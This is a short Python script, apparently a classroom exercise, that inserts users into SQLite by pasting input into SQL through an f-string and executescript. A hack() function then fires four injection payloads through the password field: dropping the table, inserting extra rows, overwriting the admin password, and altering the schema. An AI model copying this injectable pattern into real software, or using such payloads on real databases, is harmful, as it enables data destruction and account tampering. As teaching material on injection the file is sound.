import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('hw.db') as db:
        cursor = db.cursor()
        cursor.executescript(
            f"""
            INSERT INTO 'table_users' (username, password)
                VALUES ('{username}', '{password}')  
            """
        )
        db.commit()


def hack() -> None:
    username: str = "i_like"
    password: str = "sql_injection"
    register(username, password)

    #1 Удаление таблицы:
    username: str = "username"
    password: str = "'); DROP TABLE table_users; --"
    register(username, password)

    #2 Добавление большого количества новых записей:
    username: str = "username"
    password: str = "'); INSERT INTO table_users (username, password) VALUES ('user1', 'password1'), ('user2', 'password2'), ('user3', 'password3'); --"
    register(username, password)

    #3 Изменение существующих записей:
    username: str = "username"
    password: str = "admin'); UPDATE table_users SET password='new_password' WHERE username='admin'; --"
    register(username, password)

    #4 Изменение схемы таблицы:
    username: str = "username"
    password: str = "username1'); ALTER TABLE table_users ADD COLUMN email TEXT; --"
    register(username, password)


if __name__ == '__main__':
    hack()
